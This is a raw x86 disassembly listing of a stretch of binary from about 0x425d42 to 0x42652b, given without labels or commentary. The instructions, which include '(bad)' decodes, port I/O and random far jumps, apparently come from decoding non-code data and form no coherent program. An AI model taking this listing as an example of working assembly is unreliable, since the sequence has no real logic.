  425d42:	aas    
  425d43:	jle    0x425db8
  425d45:	aam    0x7d
  425d47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d48:	xchg   edi,eax
  425d49:	xchg   edx,eax
  425d4a:	add    dl,0x9
  425d4d:	js     0x425d1c
  425d4f:	lods   al,BYTE PTR ds:[esi]
  425d50:	stc    
  425d51:	pop    edi
  425d52:	sbb    al,0xce
  425d54:	jge    0x425d3a
  425d56:	bound  edi,QWORD PTR [ecx-0x2c6f3c41]
  425d5c:	jb     0x425d94
  425d5e:	in     al,dx
  425d5f:	ror    cl,1
  425d61:	sar    al,1
  425d63:	outs   dx,BYTE PTR ds:[esi]
  425d64:	in     al,0xb9
  425d66:	and    cl,BYTE PTR [esi-0x6c1a94f8]
  425d6c:	mov    bh,0x31
  425d6e:	fcomp  DWORD PTR [edi+0x2b69d1cd]
  425d74:	pop    ss
  425d75:	xor    esi,ebx
  425d77:	mov    ah,0xfd
  425d79:	jno    0x425d8d
  425d7b:	mov    esp,DWORD PTR [ebx-0x4f6c6497]
  425d81:	cdq    
  425d82:	sub    eax,0xf37f408a
  425d87:	cdq    
  425d88:	lock dec ebx
  425d8a:	mov    ebp,0xc2cdc9ba
  425d8f:	icebp  
  425d90:	pop    edx
  425d91:	cwde   
  425d92:	mov    bh,0x2a
  425d94:	inc    edi
  425d95:	jbe    0x425d4e
  425d97:	aas    
  425d98:	push   ebp
  425d99:	or     eax,0xbbfc2917
  425d9e:	jge    0x425d4e
  425da0:	sbb    cl,BYTE PTR [edx+0x3ceb8c4d]
  425da6:	inc    edx
  425da7:	sbb    cl,BYTE PTR [ebp+0x73]
  425daa:	mov    ebp,0xa73bb176
  425daf:	pusha  
  425db0:	int    0x8c
  425db2:	pop    eax
  425db3:	ret    
  425db4:	sbb    eax,0x4ece5f70
  425db9:	call   0xbd1b:0x1a6ffe7d
  425dc0:	cdq    
  425dc1:	adc    eax,0xa308054a
  425dc6:	push   esp
  425dc7:	pop    edi
  425dc8:	cmp    eax,0x80b6db6e
  425dcd:	scas   al,BYTE PTR es:[edi]
  425dce:	js     0x425e0a
  425dd0:	scas   eax,DWORD PTR es:[edi]
  425dd1:	jne    0x425dff
  425dd3:	call   0x2e3a:0xa8709cba
  425dda:	xor    al,0x38
  425ddc:	xor    dh,BYTE PTR [ebx+0x3b56ae83]
  425de2:	jbe    0x425db8
  425de4:	lods   al,BYTE PTR ds:[esi]
  425de5:	cwde   
  425de6:	sar    DWORD PTR [edi-0x1f],cl
  425de9:	cli    
  425dea:	mov    ds:0x18af4279,eax
  425def:	mov    cl,0x56
  425df1:	sub    eax,0xb9220740
  425df6:	dec    esi
  425df7:	fiadd  WORD PTR [edx-0x1f]
  425dfa:	imul   eax,DWORD PTR [edx+0x66d51273],0x20
  425e01:	inc    edi
  425e02:	popf   
  425e03:	int3   
  425e04:	sub    al,0x27
  425e06:	test   DWORD PTR [eax+esi*8],edi
  425e09:	mov    eax,esi
  425e0b:	mov    esi,0x6899c902
  425e10:	lea    eax,[edi]
  425e12:	imul   esp,DWORD PTR [esp+esi*2+0x1c431c5f],0x47
  425e1a:	popa   
  425e1b:	ret    
  425e1c:	scas   al,BYTE PTR es:[edi]
  425e1d:	and    dh,BYTE PTR [ecx+0x4a4a46db]
  425e23:	ret    
  425e24:	aaa    
  425e25:	js     0x425da7
  425e27:	ins    BYTE PTR es:[edi],dx
  425e28:	xchg   ebx,eax
  425e29:	lds    esi,FWORD PTR [esi]
  425e2b:	scas   al,BYTE PTR es:[edi]
  425e2c:	jnp    0x425e71
  425e2e:	aad    0xe6
  425e30:	add    DWORD PTR [ecx+0x4d],0xbb2eccef
  425e37:	lea    ecx,[esi]
  425e39:	push   ecx
  425e3a:	push   es
  425e3b:	outs   dx,DWORD PTR ds:[esi]
  425e3c:	test   al,0xab
  425e3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  425e47:	add    BYTE PTR [eax],al
  425e49:	add    BYTE PTR [edx+0x44],al
  425e4c:	inc    ebp
  425e4d:	pop    eax
  425e4e:	inc    edi
  425e4f:	pop    ecx
  425e50:	pop    edi
  425e51:	pop    esi
  425e52:	mov    bl,0x51
  425e54:	push   eax
  425e55:	mov    cl,0x6d
  425e57:	sbb    DWORD PTR [ecx+edx*2],ecx
  425e5a:	popf   
  425e5b:	jmp    0x425e5e
  425e5d:	add    BYTE PTR [ebp+0x6],bh
  425e60:	add    BYTE PTR [eax],al
  425e62:	mov    ecx,0x4d26ceb0
  425e67:	lahf   
  425e68:	cmp    eax,0xc1b24569
  425e6d:	imul   ecx,DWORD PTR [edi],0xffffffa1
  425e70:	dec    eax
  425e71:	addr16 ja 0x425eab
  425e74:	cmp    BYTE PTR [eax],ah
  425e76:	and    esi,DWORD PTR [ecx+0x37e82d37]
  425e7c:	pop    ss
  425e7d:	cmc    
  425e7e:	jns    0x425ed2
  425e80:	sub    BYTE PTR [ecx-0x67],bl
  425e83:	adc    bh,BYTE PTR [ecx]
  425e85:	lock dec ebx
  425e87:	inc    esi
  425e88:	push   ecx
  425e89:	and    eax,0x2de7e7dc
  425e8e:	mov    WORD PTR [edi+ebp*4],ds
  425e91:	outs   dx,BYTE PTR ds:[esi]
  425e92:	out    0xc7,eax
  425e94:	call   0x1244:0xbae4da07
  425e9b:	rcr    BYTE PTR [edx],1
  425e9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e9e:	cs or  al,0x9c
  425ea1:	mov    cl,0xfb
  425ea3:	pop    es
  425ea4:	stos   DWORD PTR es:[edi],eax
  425ea5:	add    al,0x88
  425ea7:	out    0xff,eax
  425ea9:	pop    ebp
  425eaa:	jmp    0x425e53
  425eac:	push   es
  425ead:	jb     0x425e92
  425eaf:	cwde   
  425eb0:	push   ss
  425eb1:	sbb    DWORD PTR [edx-0x717e9c54],ecx
  425eb7:	stc    
  425eb8:	retf   
  425eb9:	rcl    ah,1
  425ebb:	or     DWORD PTR [edi],esp
  425ebd:	retf   
  425ebe:	nop
  425ebf:	adc    ebp,esi
  425ec1:	test   al,0x9e
  425ec3:	sub    eax,0x5ad5dcd
  425ec8:	adc    eax,0x788d2e69
  425ecd:	sub    DWORD PTR [edi+0x47],ebp
  425ed0:	add    ebx,ebp
  425ed2:	mov    al,0x22
  425ed4:	sbb    DWORD PTR [edi-0x52],esi
  425ed7:	sbb    eax,0x5506da19
  425edc:	or     eax,0xd1d6ab15
  425ee1:	mov    ch,cl
  425ee3:	add    esi,DWORD PTR [edi+0x3fd352b]
  425ee9:	push   ecx
  425eea:	leave  
  425eeb:	loope  0x425edc
  425eed:	push   edx
  425eee:	cmp    al,0x88
  425ef0:	mov    bh,0x25
  425ef2:	(bad)  
  425ef3:	js     0x425f68
  425ef5:	aam    0xca
  425ef7:	enter  0x5556,0x77
  425efb:	retf   
  425efc:	sub    esi,esi
  425efe:	popf   
  425eff:	lea    edx,[esi]
  425f01:	outs   dx,BYTE PTR ds:[esi]
  425f02:	adc    DWORD PTR [ecx+0x1b691e0c],ebx
  425f08:	sub    edi,DWORD PTR [edx-0x1e3706f4]
  425f0e:	outs   dx,DWORD PTR ds:[esi]
  425f0f:	scas   al,BYTE PTR es:[edi]
  425f10:	jbe    0x425eb7
  425f12:	mov    edi,0xe1e716bc
  425f17:	cmp    eax,0x15b8743f
  425f1c:	cmp    BYTE PTR [eax+0x25],bh
  425f1f:	pop    ebp
  425f20:	jae    0x425f85
  425f22:	je     0x425f23
  425f24:	pop    es
  425f25:	cmp    esi,DWORD PTR [ecx+0x635517e8]
  425f2b:	leave  
  425f2c:	pushf  
  425f2d:	popa   
  425f2e:	out    0x1a,eax
  425f30:	fcomip st,st(5)
  425f32:	mov    cl,0x24
  425f34:	stos   BYTE PTR es:[edi],al
  425f35:	mov    ebx,0xbd0a72f8
  425f3a:	fwait
  425f3b:	in     eax,0x78
  425f3d:	sub    DWORD PTR [eax],ecx
  425f3f:	pop    esp
  425f40:	fsubr  DWORD PTR [ecx+0x48e8efd9]
  425f46:	mov    cl,0xe7
  425f48:	gs clc 
  425f4a:	push   edx
  425f4b:	xor    al,0xf1
  425f4d:	xor    cl,bh
  425f4f:	js     0x425f75
  425f51:	jmp    DWORD PTR [eax+0x7c]
  425f54:	pop    ebp
  425f55:	xor    al,0xf8
  425f57:	jo     0x425fd6
  425f59:	and    BYTE PTR [eax],0xe0
  425f5c:	sar    DWORD PTR [esi+ecx*4],cl
  425f5f:	mov    ds:0x461ed72d,al
  425f64:	mov    ah,0x9a
  425f66:	jl     0x425f42
  425f68:	mov    ch,dh
  425f6a:	or     eax,0x6bd34cab
  425f6f:	in     al,dx
  425f70:	push   ebp
  425f71:	repz shl DWORD PTR [eax],cl
  425f74:	loop   0x425f0a
  425f76:	vcvtsi2sd xmm5,xmm1,edx
  425f7a:	jo     0x425fb5
  425f7c:	pop    es
  425f7d:	popa   
  425f7e:	jae    0x425f82
  425f80:	jge    0x425f14
  425f82:	xor    al,0x53
  425f84:	scas   eax,DWORD PTR es:[edi]
  425f85:	aas    
  425f86:	push   0xb2e760f4
  425f8b:	in     al,dx
  425f8c:	inc    esi
  425f8d:	mov    DWORD PTR [edx+0x41e48019],ebx
  425f93:	or     BYTE PTR [edi],bh
  425f95:	fidivr WORD PTR [esi-0x187bbfd0]
  425f9b:	inc    ebx
  425f9c:	shl    DWORD PTR [ebx],0x64
  425f9f:	jg     0x426014
  425fa1:	fistp  QWORD PTR [edx-0xd5c9b56]
  425fa7:	shl    ah,cl
  425fa9:	dec    ecx
  425faa:	cmp    bh,ch
  425fac:	mov    eax,edx
  425fae:	jl     0x425fd4
  425fb0:	adc    eax,0xd82c3ae4
  425fb5:	add    BYTE PTR [esi+ebx*2-0x4ab2ecae],0xd8
  425fbd:	xor    BYTE PTR [esi],dl
  425fbf:	cli    
  425fc0:	xor    eax,0x5ea8ca36
  425fc5:	mov    dl,0x15
  425fc7:	shl    ah,0x72
  425fca:	adc    edx,DWORD PTR [edx+0x73]
  425fcd:	sbb    BYTE PTR [esi],cl
  425fcf:	jle    0x426012
  425fd1:	mov    dh,0xf5
  425fd3:	sbb    al,0xc1
  425fd6:	and    edi,DWORD PTR gs:[eax+0x56]
  425fda:	repz sub BYTE PTR [edi],bl
  425fdd:	ds xchg ebx,eax
  425fdf:	inc    edi
  425fe0:	inc    ebx
  425fe1:	lods   eax,DWORD PTR ds:[esi]
  425fe2:	call   0x9f3bd0fb
  425fe7:	ret    
  425fe8:	adc    ebp,ecx
  425fea:	addr16 xchg ebx,eax
  425fec:	sub    bl,bl
  425fee:	push   ebx
  425fef:	in     eax,0x16
  425ff1:	scas   al,BYTE PTR es:[edi]
  425ff2:	sbb    eax,0x79e4d13
  425ff7:	fistp  DWORD PTR [esi]
  425ff9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425ffa:	test   al,0x5
  425ffc:	hlt    
  425ffd:	fist   DWORD PTR ds:[esi-0x7ed47afb]
  426004:	ror    BYTE PTR [ecx+0x70],0xc4
  426008:	lods   eax,DWORD PTR ds:[esi]
  426009:	test   DWORD PTR [ebp+0xc],esi
  42600c:	ins    BYTE PTR es:[edi],dx
  42600d:	test   eax,0x4c3cf792
  426012:	lods   eax,DWORD PTR ds:[esi]
  426013:	(bad)  
  426014:	push   cs
  426015:	mov    ah,0x7f
  426017:	mov    al,dl
  426019:	das    
  42601a:	test   eax,0x8515aa1f
  42601f:	pop    edx
  426020:	jle    0x426079
  426022:	xchg   ebx,eax
  426023:	cmp    cl,BYTE PTR [esi+edx*4-0x2fa6c0ef]
  42602a:	pop    ss
  42602b:	fmul   QWORD PTR [ecx+0x1a]
  42602e:	cs inc esi
  426030:	call   0x40235009
  426035:	and    eax,0x72d5f1b
  42603a:	aas    
  42603b:	js     0x426079
  42603d:	sub    al,0x7a
  42603f:	sbb    dl,BYTE PTR [ecx]
  426041:	imul   ecx,DWORD PTR [edx-0x2c2972e8],0xffffffce
  426048:	pop    edi
  426049:	loop   0x426066
  42604b:	jl     0x42603e
  42604d:	cs retf 0x8b06
  426051:	jmp    0x7d090696
  426056:	mov    ecx,0x7bbaa0e2
  42605b:	fld    DWORD PTR [edx]
  42605d:	cmc    
  42605e:	je     0x4260a9
  426060:	jl     0x426035
  426062:	push   ebx
  426063:	call   0xd14f2ca1
  426068:	jmp    0x4260d8
  42606a:	cwde   
  42606b:	xor    esp,DWORD PTR [ecx+ebx*4]
  42606e:	out    0x15,al
  426070:	mov    edx,0x5ea2bd98
  426075:	push   ds
  426076:	xor    al,0x2b
  426078:	mov    al,ds:0xb8f9314c
  42607d:	jle    0x4260d6
  42607f:	lods   eax,DWORD PTR ds:[esi]
  426080:	into   
  426081:	jmp    0x426034
  426083:	jle    0x42603e
  426085:	clc    
  426086:	inc    esi
  426087:	mov    ?,edi
  426089:	push   ds
  42608a:	rcr    DWORD PTR [edx+0xa],1
  42608d:	iret   
  42608e:	dec    edi
  42608f:	out    dx,al
  426090:	push   ss
  426091:	xchg   edx,eax
  426092:	cld    
  426093:	pop    edi
  426094:	mov    ch,0x70
  426096:	outs   dx,DWORD PTR ds:[esi]
  426097:	mov    esi,0x1e8c8984
  42609c:	stc    
  42609d:	in     al,0x36
  42609f:	cmp    eax,DWORD PTR [esi+0x60abbd8b]
  4260a5:	push   ebp
  4260a6:	frstor ds:0xb5a45ef5
  4260ac:	inc    esp
  4260ad:	inc    esp
  4260ae:	fidiv  DWORD PTR ds:0x8486bab4
  4260b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260b5:	mov    ecx,0x32df02ba
  4260ba:	jg     0x42605d
  4260bc:	mov    al,ds:0x7281954c
  4260c1:	fdivr  QWORD PTR fs:[esi]
  4260c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4260c5:	arpl   WORD PTR [edi-0x69],bx
  4260c8:	adc    DWORD PTR [edx+0x2963a2e8],ecx
  4260ce:	or     ebp,DWORD PTR [ecx]
  4260d0:	add    bl,al
  4260d2:	and    al,BYTE PTR [eax-0x7b]
  4260d5:	jmp    0x426097
  4260d7:	int    0x32
  4260d9:	or     al,0xa7
  4260db:	push   ecx
  4260dc:	ret    0xf574
  4260df:	call   0x5d1e:0x6937627
  4260e6:	loopne 0x426115
  4260e8:	inc    esp
  4260e9:	retf   
  4260ea:	not    DWORD PTR [esi]
  4260ec:	ins    DWORD PTR es:[edi],dx
  4260ed:	(bad)
  4260f0:	push   cs
  4260f1:	cmc    
  4260f2:	scas   eax,DWORD PTR es:[edi]
  4260f3:	in     al,0xcc
  4260f5:	push   fs
  4260f7:	mov    esi,0x54e5da6d
  4260fc:	es mov bh,0x48
  4260ff:	clc    
  426100:	sub    edi,DWORD PTR [esi]
  426102:	shl    BYTE PTR [esp+eiz*8+0x27],1
  426106:	add    BYTE PTR [eax+esi*8-0x70],al
  42610a:	sbb    eax,0x4c0fba04
  42610f:	push   esp
  426110:	and    DWORD PTR [ebp-0x72],eax
  426113:	outs   dx,DWORD PTR ds:[esi]
  426114:	sub    al,0x5e
  426116:	xchg   esp,eax
  426117:	cld    
  426118:	xor    eax,0x9c47bfb8
  42611d:	xor    ch,ah
  42611f:	pop    edi
  426120:	mov    eax,ds:0x51428c5a
  426125:	mov    ss:0x93f7c59f,al
  42612b:	fsubr  st(2),st
  42612d:	sub    esp,edi
  42612f:	out    dx,al
  426130:	sbb    ch,BYTE PTR [edi+edi*2+0x2bd7f6d2]
  426137:	jmp    0x426147
  426139:	in     al,0x53
  42613b:	popf   
  42613c:	jle    0x42613e
  42613e:	mov    al,ds:0x344e1910
  426143:	cmp    al,0xa6
  426145:	es inc esi
  426147:	aam    0x5b
  426149:	fsubp  st(2),st
  42614b:	cmp    bh,BYTE PTR [esi+ecx*4]
  42614e:	jge    0x4261cc
  426150:	cmp    edi,ebp
  426152:	push   ds
  426153:	call   0x97bd98cb
  426158:	push   ebx
  426159:	and    esp,DWORD PTR [edi]
  42615b:	jae    0x42612c
  42615d:	call   0x2668617c
  426162:	push   edx
  426163:	ror    dl,0x52
  426166:	fwait
  426167:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426168:	push   edx
  426169:	aas    
  42616a:	dec    edx
  42616b:	fadd   QWORD PTR [ebp-0x6c489321]
  426171:	stos   DWORD PTR es:[edi],eax
  426172:	sbb    eax,0x3d91cc0d
  426177:	imul   ebp,DWORD PTR [esi-0x30],0x7c
  42617b:	popf   
  42617c:	xchg   ecx,eax
  42617d:	cmp    DWORD PTR [ecx+0x61eba1d6],edx
  426183:	out    0x70,eax
  426185:	cmp    bh,BYTE PTR fs:[esi-0x7a]
  426189:	mov    DWORD PTR [edx+0x70],ebp
  42618c:	add    ebp,ebp
  42618e:	stc    
  42618f:	xchg   esp,eax
  426190:	and    BYTE PTR [esi],ch
  426192:	push   eax
  426193:	fsubr  st(7),st
  426195:	inc    esi
  426196:	jb     0x4261cb
  426198:	sahf   
  426199:	adc    bl,BYTE PTR [ecx+0x2a]
  42619c:	xor    DWORD PTR [esi+ebx*8-0xe73a955],esi
  4261a3:	and    eax,0xf52a7226
  4261a8:	addr16 dec edi
  4261aa:	cld    
  4261ab:	xor    ebx,esp
  4261ad:	mov    edi,0xa1ca35ae
  4261b2:	arpl   WORD PTR [edx+0x39],sp
  4261b5:	and    BYTE PTR [ecx+ebp*2],al
  4261b8:	sbb    DWORD PTR [ebp-0x7b0d649e],esp
  4261be:	stos   BYTE PTR es:[edi],al
  4261bf:	jecxz  0x4261b9
  4261c1:	dec    esp
  4261c3:	into   
  4261c4:	mov    ds:0x11cb587,eax
  4261c9:	cmp    al,0x3
  4261cb:	test   ah,al
  4261cd:	push   ebx
  4261ce:	rcr    BYTE PTR ds:0x38982193,0x11
  4261d5:	inc    ebp
  4261d6:	leave  
  4261d7:	shl    DWORD PTR [eax+ecx*4],0xb
  4261db:	xor    BYTE PTR [ecx-0x21],al
  4261de:	jmp    0x3f41:0x6cb7b4cb
  4261e5:	inc    esp
  4261e6:	push   es
  4261e7:	in     al,0x89
  4261e9:	dec    eax
  4261ea:	jno    0x42619b
  4261ec:	add    al,BYTE PTR [ecx]
  4261ee:	iret   
  4261ef:	popf   
  4261f0:	jnp    0x4261f0
  4261f2:	inc    esi
  4261f3:	lahf   
  4261f4:	sbb    esp,eax
  4261f6:	or     DWORD PTR [ebx-0x10],eax
  4261f9:	je     0x4261de
  4261fb:	call   0x250db792
  426200:	das    
  426201:	adc    ecx,DWORD PTR [eax+eax*1-0x3104cdd0]
  426208:	inc    ebx
  426209:	mov    esi,0x36d96a19
  42620e:	add    esi,DWORD PTR [edi+0x30]
  426211:	push   0xfffffff8
  426213:	lods   al,BYTE PTR ds:[esi]
  426214:	push   ecx
  426215:	mov    ebp,0x5dd01103
  42621a:	dec    ebp
  42621b:	add    al,dl
  42621d:	add    al,0x59
  42621f:	arpl   WORD PTR [ebp+0x1c],di
  426222:	pushf  
  426223:	out    dx,al
  426224:	fdiv   st,st(4)
  426226:	xchg   esi,eax
  426227:	rep ins BYTE PTR es:[edi],dx
  426229:	sub    al,0xa4
  42622b:	rcr    DWORD PTR [eax-0x43899be],cl
  426231:	xor    eax,0xc017eedc
  426236:	out    0x1e,al
  426238:	leave  
  426239:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42623a:	call   0xeb211400
  42623f:	and    al,0xa5
  426241:	repz dec ebp
  426243:	iret   
  426244:	scas   eax,DWORD PTR es:[edi]
  426245:	mov    ecx,0x565a8713
  42624a:	lea    esp,[ecx+0x762236be]
  426250:	xor    eax,0xf420b737
  426255:	jecxz  0x426232
  426257:	rol    BYTE PTR [ebp+0x1d],0x58
  42625b:	push   eax
  42625c:	mov    al,ds:0xf198de28
  426261:	sbb    dl,BYTE PTR [ecx-0x24]
  426264:	fdiv   QWORD PTR [ebp-0x1e]
  426267:	adc    edx,eax
  426269:	mov    ecx,0x26366837
  42626e:	sub    DWORD PTR [edx],esp
  426270:	or     esi,DWORD PTR [edi+0x13]
  426273:	inc    eax
  426274:	add    esp,DWORD PTR [edi+0xe009c5b]
  42627a:	pop    ss
  42627b:	out    dx,al
  42627c:	gs (bad) 
  42627f:	xchg   ebx,eax
  426280:	out    dx,al
  426281:	or     dh,bl
  426283:	or     DWORD PTR [ecx+0x6f162b0d],ebx
  426289:	inc    esp
  42628a:	dec    eax
  42628b:	or     DWORD PTR [esi+esi*4-0x56],esi
  42628f:	adc    edx,DWORD PTR [eax]
  426291:	out    dx,eax
  426292:	lods   eax,DWORD PTR ds:[esi]
  426293:	mov    gs,ebx
  426295:	push   esi
  426296:	loop   0x42621f
  426298:	je     0x4262a8
  42629a:	into   
  42629b:	xor    DWORD PTR [ecx],esp
  42629d:	mov    ebp,0xa37aee9c
  4262a2:	and    al,0x4a
  4262a4:	mov    gs,WORD PTR [edx-0x17790a9a]
  4262aa:	cmp    BYTE PTR [edx-0x6f4fe102],ch
  4262b0:	inc    esi
  4262b1:	cmp    al,0x72
  4262b3:	jmp    0x596:0xe2369646
  4262ba:	pop    ebp
  4262bb:	pop    esi
  4262bc:	movq   QWORD PTR [eax+0x2e],mm7
  4262c0:	aas    
  4262c1:	mov    ds:0x2eefc7e5,eax
  4262c6:	js     0x426334
  4262c8:	jmp    0x8fda6fcd
  4262cd:	sub    ah,BYTE PTR [ebx+0x9]
  4262d0:	jl     0x426335
  4262d2:	adc    BYTE PTR [ebp+0x2b],dh
  4262d5:	jne    0x42634d
  4262d7:	retf   0x54e7
  4262da:	sbb    eax,0x613b6c02
  4262df:	retf   
  4262e0:	sub    al,0x17
  4262e2:	or     al,BYTE PTR [edx+0x6f295ba5]
  4262e8:	(bad)  
  4262e9:	push   cs
  4262ea:	ss inc ebp
  4262ec:	fisttp WORD PTR [edx]
  4262ee:	mov    ch,0x7e
  4262f0:	and    DWORD PTR [edx+0x6c],esp
  4262f3:	mov    dl,0x71
  4262f5:	jns    0x4262be
  4262f7:	pop    ebp
  4262f8:	fisubr DWORD PTR ds:0xddb527a6
  4262fe:	jp     0x42636e
  426300:	out    0x71,eax
  426302:	add    BYTE PTR [ecx+0x2f4ca8be],ch
  426308:	rol    edi,0xab
  42630b:	lea    eax,[edi]
  42630d:	mov    al,ds:0xe0a21fb1
  426312:	dec    esi
  426313:	stos   DWORD PTR es:[edi],eax
  426314:	or     eax,DWORD PTR [ebp*2+0x3b258891]
  42631b:	add    BYTE PTR [ecx-0x7],ch
  42631e:	(bad)  
  42631f:	in     eax,0x12
  426321:	dec    eax
  426322:	lahf   
  426323:	ja     0x4262ea
  426325:	fdiv   QWORD PTR [eax+esi*8+0x57]
  426329:	dec    esp
  42632a:	mov    es,edi
  42632c:	ficom  DWORD PTR [edi-0x304400b3]
  426332:	call   0xbdc0:0x714e9d25
  426339:	mov    dl,0x4b
  42633b:	push   0xffffffdf
  42633d:	xor    eax,0xc3505c2b
  426342:	call   0x60bf271c
  426347:	ins    DWORD PTR es:[edi],dx
  426348:	sbb    DWORD PTR [eax-0x2f],0xffffffbd
  42634c:	sbb    ah,BYTE PTR [edi+0x18]
  42634f:	mov    al,ds:0x79ce334f
  426354:	fs dec ecx
  426356:	xor    edx,ebp
  426358:	(bad)  
  426359:	jmp    0x426390
  42635b:	sbb    DWORD PTR ss:[eax+eax*2],0xffffffb9
  426360:	jl     0x42639c
  426362:	xchg   DWORD PTR [edx-0x6a],eax
  426365:	imul   ecx,DWORD PTR [edi],0x6a
  426368:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426369:	daa    
  42636a:	inc    esp
  42636b:	addr16 iret 
  42636d:	jle    0x4263d3
  42636f:	cld    
  426370:	aam    0xca
  426372:	ret    0x3654
  426375:	cwde   
  426376:	cdq    
  426377:	xor    al,0x1b
  426379:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42637a:	mov    esp,0x633b0db0
  42637f:	retf   
  426380:	(bad)  
  426381:	and    DWORD PTR [edi-0x2e],edi
  426384:	pop    edi
  426385:	mov    DWORD PTR [edi],esp
  426387:	sub    al,0x53
  426389:	pop    esp
  42638a:	pop    esi
  42638b:	fnsave [edi-0x9e9ed5e]
  426391:	jl     0x4263dc
  426393:	outs   dx,DWORD PTR ds:[esi]
  426394:	test   DWORD PTR [ebx],eax
  426396:	cmp    cl,BYTE PTR [ebx]
  426398:	outs   dx,BYTE PTR ds:[esi]
  426399:	or     esp,DWORD PTR [edi]
  42639b:	les    eax,FWORD PTR [edx]
  42639d:	daa    
  42639e:	mov    cl,BYTE PTR ds:0x9cdfe712
  4263a4:	sub    eax,0x1088d891
  4263a9:	jnp    0x4263e8
  4263ab:	mov    DWORD PTR [ecx],ebx
  4263ad:	add    al,0x15
  4263af:	jns    0x42634a
  4263b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4263b2:	lds    eax,FWORD PTR [edx-0x24fdc732]
  4263b8:	out    dx,al
  4263b9:	mov    ebp,0xd06b439f
  4263be:	add    dh,al
  4263c0:	test   DWORD PTR [ebp+0x52938cac],edx
  4263c6:	mov    ecx,0x998865cd
  4263cb:	daa    
  4263cc:	adc    eax,0x33ef1963
  4263d1:	adc    edx,DWORD PTR [ebx-0x3aee4127]
  4263d7:	ret    
  4263d8:	shr    DWORD PTR [eax],1
  4263da:	xor    eax,DWORD PTR ds:0x33f1a8b8
  4263e0:	arpl   WORD PTR [eax-0xd],si
  4263e3:	xchg   edx,eax
  4263e4:	mov    bl,BYTE PTR [edx+0x4dbd444a]
  4263ea:	popf   
  4263eb:	dec    esp
  4263ec:	xor    BYTE PTR [eax+0x44],bl
  4263ef:	pop    ebp
  4263f0:	bound  esi,QWORD PTR [edx]
  4263f2:	mov    esp,0x19148142
  4263f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4263f8:	pop    edi
  4263f9:	mov    dl,0x52
  4263fb:	xor    eax,0x64a6609
  426400:	shl    BYTE PTR [ebx-0x165dba],cl
  426406:	xor    eax,0xb5988504
  42640b:	lock loop 0x42643b
  42640e:	mul    DWORD PTR [ecx]
  426410:	mov    cl,0xae
  426412:	pop    ecx
  426413:	js     0x42647a
  426415:	test   DWORD PTR [eax-0x4ba9b370],0x32135073
  42641f:	push   0xf5ee7091
  426424:	adc    DWORD PTR [eax+0x6e57594e],ecx
  42642a:	aaa    
  42642b:	jmp    0xbff5:0x4cb9b286
  426432:	mov    dh,0xd8
  426434:	mov    ?,WORD PTR [edx-0x32]
  426437:	jmp    0x426491
  426439:	mov    edi,0x43884f4f
  42643e:	je     0x426420
  426440:	xor    al,0x71
  426442:	(bad)  
  426444:	les    ebp,FWORD PTR [esi*1+0x783fca7c]
  42644b:	ror    DWORD PTR [edi],1
  42644d:	and    ch,BYTE PTR [esi-0x7a5855fb]
  426453:	leave  
  426454:	fistp  DWORD PTR [ebx+edx*1]
  426457:	(bad)  
  426458:	aam    0x28
  42645a:	or     BYTE PTR [eax+0x22],dh
  42645d:	or     edi,edi
  42645f:	imul   ecx,DWORD PTR [edi+0x5119216d],0x18
  426466:	pop    esp
  426467:	mov    edi,0xda68149
  42646c:	test   BYTE PTR [edx],bl
  42646e:	inc    edi
  42646f:	sbb    edx,ecx
  426471:	mov    eax,0xef4d1b93
  426476:	jo     0x426440
  426478:	adc    edi,DWORD PTR [ecx-0x13]
  42647b:	lods   eax,DWORD PTR ds:[esi]
  42647c:	mov    bh,0xb4
  42647e:	add    eax,0xc1700c5f
  426483:	rcr    BYTE PTR [edi-0x35],cl
  426486:	fnstenv [eax+edx*1-0x876b83d]
  42648d:	jb     0x426460
  42648f:	sar    DWORD PTR [ecx+edx*1],0x1f
  426493:	push   esi
  426494:	lods   al,BYTE PTR ds:[esi]
  426495:	mov    bl,0x5d
  426497:	jmp    0x2e04:0x91e5afde
  42649e:	sar    esp,1
  4264a0:	ret    0xd498
  4264a3:	mov    cl,0x1c
  4264a5:	cmp    DWORD PTR [eax],ebp
  4264a7:	(bad)  
  4264a8:	call   0x55f5:0x5cba196b
  4264af:	xchg   BYTE PTR [ebx-0x5b9c906a],al
  4264b5:	xchg   ecx,eax
  4264b6:	js     0x4264b3
  4264b8:	add    DWORD PTR [ebx],esp
  4264ba:	inc    ebx
  4264bb:	repnz pop edx
  4264bd:	jg     0x42645f
  4264bf:	arpl   WORD PTR cs:[ecx-0x31b99ff2],dx
  4264c6:	rcr    edx,0x9c
  4264c9:	sahf   
  4264ca:	or     eax,0xabf7b888
  4264cf:	inc    ebx
  4264d0:	push   esp
  4264d1:	enter  0xa5f2,0x4e
  4264d5:	push   0x1ce37754
  4264da:	xchg   edi,eax
  4264db:	mov    edx,0xa983d6
	...
  4264e8:	add    BYTE PTR [eax],al
  4264ea:	dec    ecx
  4264eb:	push   ebp
  4264ec:	inc    edx
  4264ed:	push   ebx
  4264ee:	pop    esi
  4264ef:	push   edi
  4264f0:	pop    ecx
  4264f1:	pop    edi
  4264f2:	ss cmc 
  4264f4:	imul   BYTE PTR [ebx]
  4264f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4264f7:	int3   
  4264f8:	and    esp,DWORD PTR [ecx]
  4264fa:	sbb    dh,dl
  4264fc:	add    DWORD PTR [eax],eax
  4264fe:	jge    0x426506
  426500:	add    BYTE PTR [eax],al
  426502:	aam    0x2f
  426504:	das    
  426505:	mov    ch,0xf
  426508:	cs jge 0x4264d8
  42650b:	xor    edi,ebp
  42650d:	adc    eax,0xbfe40d6f
  426512:	sub    eax,0xb87112b7
  426517:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426518:	test   eax,0xd795f425
  42651d:	in     eax,dx
  42651e:	mov    al,ds:0x35de23ab
  426523:	gs xor BYTE PTR gs:[edx+0x371f682a],dh
  42652b:	fwait
